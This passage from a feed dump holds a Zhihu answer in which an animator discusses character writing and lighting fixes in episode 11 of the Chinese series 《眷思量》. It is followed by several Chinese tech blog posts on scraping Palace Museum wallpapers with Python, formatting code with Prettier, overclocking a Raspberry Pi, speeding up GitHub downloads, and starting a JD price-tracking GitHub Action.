data-private-watermark-src=\"v2-99f8561635df3cf870580ca48e4d5cd9\"></p>\n<p>而镜玄其实隐忍惯了，性子本就比较沉稳，不是太难忍的事，他会持续惯常冷静模式的。但对屠丽会例外。</p>\n<p>这次他从前面集的预感，到这集真的从丽崽口中听到准备离岛，情绪第一次失控，虽然只有一瞬间，马上就意识到并先支走丽崽。对我来说也足以体现玄哥心里对这段羁绊的在乎。岁月里的陪伴对玄哥来说丽崽早就是他想守护好的存在。突然知道真的会离开相信换谁都会意难平吧。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-4015e44e420a28d3bda9e65bec2c8491_720w.jpg?rss\" data-rawwidth=\"1902\" data-rawheight=\"1062\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-4015e44e420a28d3bda9e65bec2c8491\" data-watermark-src=\"v2-a45dcaf4311db4fa6522242d9798692e\" data-private-watermark-src=\"v2-bfa86b1c80f9775798e426206e2e861b\"></p>\n<p>他捶桌子突然克制住的那一下，有一层是在努力调整收敛情绪，毕竟以玄哥的实力，真的用力锤下去，恒水居这层都保不住*罒▽罒*  ，动静太大就算周围有结界保护也不好收场。</p>\n<p>而丽崽这集也把我很想表达的性格通透的点找到合适的事件表达出来了。她懂是她豁达的立足点，但她不会妥协，仍然有明确的目标去实施，但“恒老”的生气也会让她反思，虽然方向有些乌龙～～丽崽你凭自己身为凡人的寿命是送不走玄哥的(ฅ&gt;ω&lt;*ฅ)</p>\n<p>到这一集，屠丽这个角色的塑造，进行完了大部分铺垫，她于我是特别的，可能成长过程中一直碰壁导致的不服气吧，普通女孩为何不能当主角？用实力证明自己成为更优秀有地位的人，对我来说比天生含着金汤匙要更动人，毕竟生来富贵是少数，大多数都要在岁月中拼搏，只有具备丽崽拼搏豁达的精神，才是立足于世间必备的生存技能。所以这次任性地要表达这样一个特立独行的女主，是清澈透亮又是豁达坚毅的！</p>\n<p><img src=\"https://pic3.zhimg.com/v2-38887e80b7277603548ff73e6a564a1f_720w.jpg?rss\" data-rawwidth=\"2128\" data-rawheight=\"1206\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-38887e80b7277603548ff73e6a564a1f\" data-watermark-src=\"v2-57c503d62f27fbe0441e9db93b72606c\" data-private-watermark-src=\"v2-e6304d18d94e210b50c228d704b0b740\"></p>\n<p>这集对两位主角都是性格细化丰满的一集，对配角展现较多的是小侯爷萧霁；强调了他的共情力，他理解丽娘在岛上没有归属感，所以也希望她回凡间找到“家”的概念；相信也会成为他的人格魅力之一。但镜玄目前并不相信萧霁是为屠丽好，两人后续矛盾点还是会有的。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-a4ea8f6a4ae999fe3e7744e8d78b2ca3_720w.jpg?rss\" data-rawwidth=\"1894\" data-rawheight=\"1058\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-a4ea8f6a4ae999fe3e7744e8d78b2ca3\" data-watermark-src=\"v2-1d9554efac3c1cb51dae1ce7981321b6\" data-private-watermark-src=\"v2-742b13827c3ea155ccd28770f6ab834f\"></p>\n<p>上回第一次讲了点光影设计，知乎催更团很开心(｡◝ᴗ◜｡)，并说希望能多方面科普些制作方面的点 ，可以提供给同行交流。很多方面整理素材都比较麻烦，最近花在眼睛上的时间比较多，手头最现成的还是灯光的素材啦。</p>\n<p>11这集光影比较难的点是萧霁关押处室内外的光线表现。</p>\n<p> 室内有火光，室外有天光，两人在交界处对话，两边的光线，这点确实难到了我和灯光组的小伙伴。原本从第一集推到第十一集，大家已经磨合的非常默契了，很多难点情况已在前面的集遇到并解决了。忽然有个新点要推敲，于是也把此处的处理经验分享下。</p>\n<p>如下图，(先忽略萧霁渲染版本问题)</p>\n<p>第一版是中期常规打光效果，但丽崽面部太暗和背景分不开，于是提出修改，中期改了第二版，但我推测萧霁屋内火光强度和衰减，丽在窗外不会受到这么强的烛光照射，所以会显得突兀。于是动手p图给到灯光组，同时平衡了天光对丽面部颜色的影响。但也要凸显丽面部存在，不能被背景吃掉。最终灯光组终于改好。画面和谐多了~主次也不会乱。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-d8c3e278e95e3d33f069dfafad47905a_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"2158\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-d8c3e278e95e3d33f069dfafad47905a\" data-watermark-src=\"v2-491302c4d3d83c96895214b233242d44\" data-private-watermark-src=\"v2-0b0ba6acd25a755ea7f7e3a38d99c365\"></p>\n<p>还有些情况如下图，第一张正常光线角色面部会暗很多，但是这样我好不容易给丽崽调的表情表演就看不出来了 ，于是特殊镜头特殊处理，把面光做了补光柔化提亮。在不改变画面和谐的前提下完善。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-af897c90ecc72325c8a253499d9de749_720w.jpg?rss\" data-rawwidth=\"957\" data-rawheight=\"1111\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-af897c90ecc72325c8a253499d9de749\" data-watermark-src=\"v2-33705d09b3460c7b6eb5349ed0934303\" data-private-watermark-src=\"v2-3d21e86d637bb79e7e53a7fd9b201e4c\"></p>\n<p>类似的案例还有丽靠在窗边的情况，因屋内设置了火光，丽脸上会出现木头的投影，但这个信息比较多余，且在现实光照环境中，漫反射复杂，室内光比较强烈才会有这样的投影。而电脑靠计算不会主动筛选，很多信息都会算出来。需要人为去控制，于是就让灯光组的小伙伴关掉了这层的投影链接。让丽面光更加干净利于表演。不然丽崽回头脸上就是几道杠=v=。。。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-866b066623619f8589d9a08e30ee74c1_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"2209\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-866b066623619f8589d9a08e30ee74c1\" data-watermark-src=\"v2-6d8ab2a8c37e977d86dc8d0838ffcaaf\" data-private-watermark-src=\"v2-104401936eb3a6a8b9aa0f9db00ac30b\"></p>\n<p>中间眠眠给地图的这场，整场光线和灯光组碰好后，发现这镜眼角到鼻翼结构比较清晰，让角色情绪看起来较大，于是调整灯光强度和微调颜色，让前面光线柔和很多，弱化鼻子的结构，这样面部也更柔美。这类操作也是对于眠的面光经常需要用到的技巧。可能会有朋友问那为何不把鼻子上的结构去掉~，因为模型再化简会失真，目前每个角色模型上每个细节都是非常花精力推敲到合适的  。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-08e6d511e8800f09c80b3741ce08d77e_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"1112\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-08e6d511e8800f09c80b3741ce08d77e\" data-watermark-src=\"v2-61804266ec66dde178f58953bfafc33f\" data-private-watermark-src=\"v2-7379929706b521c1fbac8c4b8004e098\"></p>\n<p>后面场次里丽崽面光这个例子也可以作为一个典型案例拿来分析下。如下图，</p>\n<p>灯光原图看起来像底光，且眼神光位置不对，达不到我需要的灵动的望着天空感怀的眼神，于是提出调整天光方向，配合眼神光角度，做到夜晚光下的和谐，及镜头含义的传递。改变有时就是需要微调即可。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-05b1ebed3d202a41c6a7998c658916a9_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"2207\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-05b1ebed3d202a41c6a7998c658916a9\" data-watermark-src=\"v2-39cbd9bca2126a53121d80633beeb2ab\" data-private-watermark-src=\"v2-209990662104fda388efef79753bd7e7\"></p>\n<p>11集最后一场，也是同理，玄哥在岩石后原本正常的灯光很暗，需要在和谐度内去提亮，以不影响本场夜晚灯光的表达。又能看清角色面部神情为主。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-a2c6c5eb27aac92585fb06914c917d02_720w.jpg?rss\" data-rawwidth=\"1133\" data-rawheight=\"536\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-a2c6c5eb27aac92585fb06914c917d02\" data-watermark-src=\"v2-4d6640cadda9f5f69e9f68775e3147e5\" data-private-watermark-src=\"v2-2baad8510e99b84d5bd4f2faa65df44f\"></p>\n<p>好啦！先分享到这里，这次真的有花很多时间努力写了，算是回报知乎小伙伴的催更和支持！下次再聊。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhao-yu-qing-95-43?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">赵禹晴</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/480037354/answer/2066582680?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">32 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/478348101?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价国产动画《眷思量》第十集？</a><br><a href=\"http://www.zhihu.com/question/476668782?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价国产动画《眷思量》第九集？</a><br>\n","link":"http://www.zhihu.com/question/480037354/answer/2066582680?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"使用 Python 爬取故宫壁纸","date":"2021-07-17 05:55:00","description":"\n<p>我非常喜欢故宫壁纸，但是一张一张下载的速度就太慢了。</p>\n<p>于是，我就写了个简单的 Python 小程序自动爬取故宫壁纸。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%A3%E7%A0%81\" class=\"headerlink\" title=\"代码\"></a>代码</h2>\n<p>首先，我们通过简单的查看，知道故宫壁纸的页面并没有使用 JavaScript 载入。</p>\n<p>但是故宫壁纸很多，所以还需要分类。</p>\n<p>故宫壁纸大多都是以分类开头，如 <code>爱上紫禁城 紫藤</code>, <code>清   虚谷紫藤金鱼图轴（局部）</code> 等等，所以一般只需要做个简单的 <code>startswith()</code> 判断就 OK 了。</p>\n<p>很多壁纸的标题都是一样的，所以还可以使用 <code>random</code> 库在文件名末尾追加一个随机数。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests, bs4, time, random</span><br><span class=\"line\">path = <span class=\"string\">\"./wallpaper/爱上紫禁城\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">catch = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">119</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    url = <span class=\"string\">\"https://www.dpm.org.cn/lights/royal/p/{}.html\"</span>.<span class=\"built_in\">format</span>(i)</span><br><span class=\"line\">    <span class=\"comment\"># 发送请求</span></span><br><span class=\"line\">    response = requests.get(url)</span><br><span class=\"line\">    <span class=\"comment\"># 设定页面编码为 UTF-8</span></span><br><span class=\"line\">    response.encoding = <span class=\"string\">\"UTF-8\"</span></span><br><span class=\"line\">    <span class=\"comment\"># 从 HTML 中解析数据</span></span><br><span class=\"line\">    soup = bs4.BeautifulSoup(response.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">    image = soup.find_all(name=<span class=\"string\">\"div\"</span>, class_=<span class=\"string\">\"pic\"</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 循环输出图片</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> image:</span><br><span class=\"line\">        catch = catch + <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"comment\"># 获得壁纸名称</span></span><br><span class=\"line\">        <span class=\"comment\"># 分类，不是以【爱上紫禁城】开头的壁纸都忽略</span></span><br><span class=\"line\">        img_name = n.a.img[<span class=\"string\">\"title\"</span>]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> img_name.startswith(<span class=\"string\">\"明\"</span>):</span><br><span class=\"line\">            print(<span class=\"string\">\"{}. {}\"</span>.<span class=\"built_in\">format</span>(catch, n.a.img[<span class=\"string\">\"title\"</span>]))</span><br><span class=\"line\">            <span class=\"comment\"># 组合获得壁纸页面</span></span><br><span class=\"line\">            url_1080 = <span class=\"string\">\"https://www.dpm.org.cn\"</span> + n.a[<span class=\"string\">\"href\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 请求高清版网页</span></span><br><span class=\"line\">            response_img = requests.get(url_1080)</span><br><span class=\"line\">            <span class=\"comment\"># 再次解析</span></span><br><span class=\"line\">            soup_img = bs4.BeautifulSoup(response_img.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">            <span class=\"comment\"># 获取页面中的图片</span></span><br><span class=\"line\">            data = soup_img.find_all(name=<span class=\"string\">\"img\"</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 获得壁纸图片的链接</span></span><br><span class=\"line\">            img_url = data[<span class=\"string\">\"src\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 保存图片</span></span><br><span class=\"line\">            pic = requests.get(img_url).content</span><br><span class=\"line\">            file_name = path + img_name + <span class=\"string\">\"-\"</span> + <span class=\"built_in\">str</span>(random.randint(<span class=\"number\">100000</span>, <span class=\"number\">999999</span>)) + <span class=\"string\">\".jpg\"</span></span><br><span class=\"line\">            <span class=\"comment\"># 写入文件</span></span><br><span class=\"line\">            <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(file_name, <span class=\"string\">\"wb\"</span>) <span class=\"keyword\">as</span> file:</span><br><span class=\"line\">                file.write(pic)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"!Ignore: \"</span> + img_name)</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>我把一些我下载下来的壁纸放在了 <a href=\"https://t.yfun.top/dpm-wallpaper\">这里</a>，可以直接预览并下载。</p>\n<p><del>OK，又水了一篇文（</del></p>\n","link":"https://blog.yfun.top/posts/2021/dpm-wallpaper/"},{"title":"使用 Prettier 格式化代码","date":"2021-07-15 06:45:00","description":"\n<p>格式化代码可以提高代码的可读性，使代码更加美观。</p>\n<p>Prettier 支持：</p>\n<ul>\n<li>JavaScript (including experimental features)</li>\n<li>JSX</li>\n<li>Angular</li>\n<li>Vue</li>\n<li>Flow</li>\n<li>TypeScript</li>\n<li>CSS, Less, and SCSS</li>\n<li>HTML</li>\n<li>JSON</li>\n<li>GraphQL</li>\n<li>Markdown, including GFM and MDX</li>\n<li>YAML</li>\n</ul>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E8%A3%85\" class=\"headerlink\" title=\"安装\"></a>安装</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%8F%92%E4%BB%B6\" class=\"headerlink\" title=\"插件\"></a>插件</h3>\n<p>你可以很方便的在 VSCode 等 IDE 上安装插件，插件名为 <code>Prettier</code>.</p>\n<p>以 VSCode 为例：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/6a3ad0ea42d55.png\"></p>\n<blockquote><p>如果安装了其他格式化插件，则需要点击 [格式化文档的方式]，选择 <code>Prettier</code>。</p></blockquote>\n<h3>\n<a href=\"https://blog.yfun.top/#CLI\" class=\"headerlink\" title=\"CLI\"></a>CLI</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo npm i -g prettier</span><br></pre></td></tr></table></figure><p>相关的文档可参见官网: <a href=\"https://prettier.io/docs/en/cli.html\">https://prettier.io/docs/en/cli.html</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">prettier --write . <span class=\"comment\"># 格式化当前文件夹的所有文件</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%85%8D%E7%BD%AE\" class=\"headerlink\" title=\"配置\"></a>配置</h2>\n<p>参见官方文档：</p>\n<ul>\n<li><p><a href=\"https://prettier.io/docs/en/configuration.html\">https://prettier.io/docs/en/configuration.html</a></p></li>\n<li><p><a href=\"https://prettier.io/docs/en/options.html\">https://prettier.io/docs/en/options.html</a></p></li>\n</ul>\n<p>Prettier 的配置文件有多种写法：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/a4cc583d84c12.png\"></p>\n<p>以使用 <code>YAML</code> 书写的 <code>.prettierrc</code> 为例：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 单行最长字符数</span></span><br><span class=\"line\"><span class=\"attr\">printWidth:</span> <span class=\"number\">80</span></span><br><span class=\"line\"><span class=\"comment\"># 制表符长度</span></span><br><span class=\"line\"><span class=\"attr\">tabWidth:</span> <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"comment\"># 是否使用 Tab</span></span><br><span class=\"line\"><span class=\"attr\">useTabs:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"comment\"># 是否加入分号</span></span><br><span class=\"line\"><span class=\"attr\">semi:</span> <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"comment\"># 单引号</span></span><br><span class=\"line\"><span class=\"attr\">singleQuote:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E6%95%88%E6%9E%9C\" class=\"headerlink\" title=\"效果\"></a>效果</h2>\n<p>格式化前：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>).then(<span class=\"function\"><span class=\"params\">res</span>=&gt;</span>res.json()).then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {<span class=\"built_in\">console</span>.log(content);<span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++){<span class=\"built_in\">console</span>.log(content[i][<span class=\"string\">'title'</span>] + <span class=\"string\">\" --- https://blog.yfun.top\"</span> + content[i][<span class=\"string\">'url'</span>])}})</span><br></pre></td></tr></table></figure><p>格式化后：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>)</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> res.json())</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(content);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++) {</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(</span><br><span class=\"line\">                content[i][<span class=\"string\">\"title\"</span>] +</span><br><span class=\"line\">                    <span class=\"string\">\" --- https://blog.yfun.top\"</span> +</span><br><span class=\"line\">                    content[i][<span class=\"string\">\"url\"</span>]</span><br><span class=\"line\">            );</span><br><span class=\"line\">        }</span><br><span class=\"line\">    });</span><br></pre></td></tr></table></figure>\n","link":"https://blog.yfun.top/posts/2021/format-code-using-prettier/"},{"title":"树莓派超频","date":"2021-06-25 07:50:00","description":"\n<div class=\"note note-info\">            <p>本文操作系统为 Ubuntu Server 20.04，其他操作系统可能有所不同。</p>          </div>\n<div class=\"note note-warning\">            <p>超频是有风险的，温度也会更高，需要比较良好的散热。</p>          </div>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>登录树莓派，进入 <code>/boot/firmware/</code> 目录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /boot/firmware/</span><br></pre></td></tr></table></figure><div class=\"note note-warning\">            <p>网上很多教程让你修改 <code>config.txt</code> 文件，但注释里已经很明确的写了：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Please DO NOT modify this file; if you need to modify the boot config, the</span><br><span class=\"line\"># \"usercfg.txt\" file is the place to include user changes. Please refer to</span><br><span class=\"line\"># the README file for a description of the various configuration files on</span><br><span class=\"line\"># the boot partition.</span><br></pre></td></tr></table></figure>\n</div>\n<p>我们修改 <code>usercfg.txt</code> 文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vim usercfg.txt</span><br></pre></td></tr></table></figure><p>在文件末尾追加配置信息，以下是我的，仅供参考：</p>\n<div class=\"note note-danger\">            <p>我使用的是 <code>Raspberry Pi 4 (4GB)</code>，并且有小风扇和散热片。<br>请根据自己的需要和配置进行更改。</p>          </div>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">force_turbo=0</span><br><span class=\"line\">arm_freq=1850</span><br><span class=\"line\">over_voltage=6</span><br><span class=\"line\">gpu_freq=650</span><br><span class=\"line\">core_freq=650</span><br><span class=\"line\">gpu_mem=620</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%87%8D%E5%90%AF\" class=\"headerlink\" title=\"重启\"></a>重启</h2>\n<p>保存文件，使用命令重启：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo reboot</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>重启完毕后，再使用 <code>lscpu</code> 命令看看 CPU 状况。</p>\n","link":"https://blog.yfun.top/posts/1445549919/"},{"title":"加速 GitHub 下载","date":"2021-06-18 09:30:00","description":"\n<p>GitHub 在国内的访问情况不太稳定，仓库克隆速度也非常慢。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E2%9C%88%EF%B8%8F\" class=\"headerlink\" title=\"✈️\"></a>✈️</h2>\n<p>不必多说。</p>\n<p>例如 <a href=\"http://127.0.0.1:7890/\">http://127.0.0.1:7890</a> 为代理地址，你可以使用下方的命令更改：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global http.proxy http://127.0.0.1:7890</span><br></pre></td></tr></table></figure><p>如果有一天不需要了，输入下面代码取消：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global --<span class=\"built_in\">unset</span> http.proxy</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#FastGit\" class=\"headerlink\" title=\"FastGit\"></a>FastGit</h2>\n<p>使用 <a href=\"https://fastgit.org/\">FastGit</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://hub.fastgit.org/\">https://hub.fastgit.org</a></p>\n<p>支持 HTTPS 克隆，并且提供 raw.githubusercontent.com 的镜像，地址为 <a href=\"https://raw.fastgit.org/\">https://raw.fastgit.org</a></p>\n<h2>\n<a href=\"https://blog.yfun.top/#CNPM\" class=\"headerlink\" title=\"CNPM\"></a>CNPM</h2>\n<p>使用 <a href=\"https://cnpmjs.org/\">CNPM</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://github.com.cnpmjs.org/\">https://github.com.cnpmjs.org</a></p>\n<p>支持 HTTPS 克隆。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Hosts\" class=\"headerlink\" title=\"Hosts\"></a>Hosts</h2>\n<p>通过更改 Hosts 文件的方式解决，但大有可能失效：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">199.232.69.194  github.global.ssl.fastly.net</span><br><span class=\"line\">140.82.113.4    github.com</span><br></pre></td></tr></table></figure><p>GitHub 上的 <a href=\"https://github.com/521xueweihan/GitHub520\">521xueweihan/GitHub520</a> 项目提供了更多关于 GitHub Hosts 列表。</p>\n<blockquote><p><a href=\"https://github.com/521xueweihan/GitHub520/issues/53\">521xueweihan/GitHub520 #53</a></p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#Gitee\" class=\"headerlink\" title=\"Gitee\"></a>Gitee</h2>\n<p>网上挺多教程，使用 Gitee 的「从 GitHub 导入」功能。</p>\n<p>不过 Gitee 限制仓库 500MB。。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Coding\" class=\"headerlink\" title=\"Coding\"></a>Coding</h2>\n<p>进入 Coding 控制台，点击「创建项目」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/k7uHJm.png\"></p>\n<p>项目模版选择「代码托管」就好，仅做下载的话无需开启太多。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bEO0vX.png\"></p>\n<p>填写项目基本信息，如名称、标识等。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/N4xjSv.png\"></p>\n<p>新建一个镜像仓库。</p>\n<p>「Git 仓库 URL」填写 GitHub 公开仓库 HTTPS 克隆地址，如：<a href=\"https://github.com/twbs/bootstrap.git\">https://github.com/twbs/bootstrap.git</a></p>\n<p>创建完成后请稍等，系统就会自动导入。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/YxnnDj.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/FmfWkf.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/OV7w4v.png\"></p>\n<p>导入完成后，点击「克隆」就能找到克隆地址。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bWszbu.png\"></p>\n<p>克隆速度挺快的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cloning into <span class=\"string\">'bootstrap'</span>...</span><br><span class=\"line\">remote: Enumerating objects: 169214, <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Counting objects: 100% (169214/169214), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Compressing objects: 100% (51634/51634), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">Receiving objects:  57% (96728/169214), 90.58 MiB | 6.83 MiB/s </span><br></pre></td></tr></table></figure><p>此外，Coding 还支持自动同步，可以设置每天的同步时间。</p>\n","link":"https://blog.yfun.top/posts/2517388641/"},{"title":"GitHub Action 监测京东商品价格","date":"2021-05-18 10:32:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p>我会在京东上买些电子产品和文具，那么如何获得商品降价信息，使用更低的价格购买呢？</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>新建一个 <code>GitHub</code> 仓库，创建 <code>main.py</code> , <code>notify.py</code> 和 <code>.github/workflows/auto.yml</code> 三个文件，内容如下：</p>  <details class=\"post-details\"><summary><code>main.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># 导入模块</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, random, json, notify</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 商品列表</span></span><br><span class=\"line\">check = [</span><br><span class=\"line\">    <span class=\"comment\"># 闪迪（SanDisk）64GB TF（MicroSD）存储卡</span></span><br><span class=\"line\">    <span class=\"string\">'1887526'</span>,</span><br><span class=\"line\">    <span class=\"comment\"># 晨光(M&amp;G)文具 0.5mm 黑色中性笔</span></span><br><span class=\"line\">    <span class=\"string\">'277393'</span></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 价格列表，用于临时存储获取到的价格数据</span></span><br><span class=\"line\">price = {}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取上次的价格文件</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode=<span class=\"string\">'r'</span>)</span><br><span class=\"line\">    lastPrice = json.loads(file.readlines()[<span class=\"number\">0</span>])</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"读取文件时出现错误！\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 遍历列表，比对价格</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> itemId <span class=\"keyword\">in</span> check:</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    <span class=\"comment\"># http://p.3.cn/prices/mgets?skuIds=J_</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://p.3.cn/prices/mgets?skuIds=J_{}'</span>.<span 